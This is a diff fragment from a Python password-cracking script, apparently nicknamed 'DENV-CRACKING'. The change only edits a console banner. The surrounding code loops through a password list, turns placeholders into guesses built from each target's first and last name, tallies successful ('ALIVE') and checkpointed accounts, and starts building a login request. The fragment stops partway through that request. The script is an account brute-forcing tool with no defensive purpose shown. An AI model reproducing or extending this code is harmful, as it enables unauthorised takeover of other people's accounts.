@@ -723,7 +723,7 @@ def ffb1(ids,names,passlist):
         except:
             ln=fn
         for pw in passlist:
-            sys.stdout.write('\r\r\033[1;36m [DENV-CRACKING-VIP] %s| \033[1;32mALIVE\033[0m║║\033[1;31mDEAD \033[1;32m%s\033[0m║║\033[1;31m%s'%(loop,len(oks),len(cps)));sys.stdout.flush()
+            sys.stdout.write('\r\r\033[1;36m [DENV-CRACKING-] %s| \033[1;32mALIVE\033[0m║  ║\033[1;31mDEAD \033[1;32m%s\033[0m║  ║\033[1;31m%s'%(loop,len(oks),len(cps)));sys.stdout.flush()
             pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
             data={
               'adid': f'{uuid.uuid4()}', 
